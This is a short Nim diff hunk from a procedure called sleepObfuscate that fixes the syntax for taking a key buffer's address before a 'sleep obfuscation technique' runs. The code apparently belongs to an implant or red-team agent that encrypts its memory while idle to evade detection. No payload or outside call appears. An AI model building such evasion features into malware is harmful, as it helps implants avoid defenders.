@@ -644,7 +644,7 @@ proc sleepObfuscate*(sleepSettings: SleepSettings) =
 
     # Generate random encryption key
     var keyBuffer: string = Bytes.toString(generateBytes(Key16)) 
-    key.Buffer = keyBuffer.addr
+    key.Buffer = addr keyBuffer
     key.Length = cast[DWORD](keyBuffer.len())
 
     # Execute sleep obfuscation technique
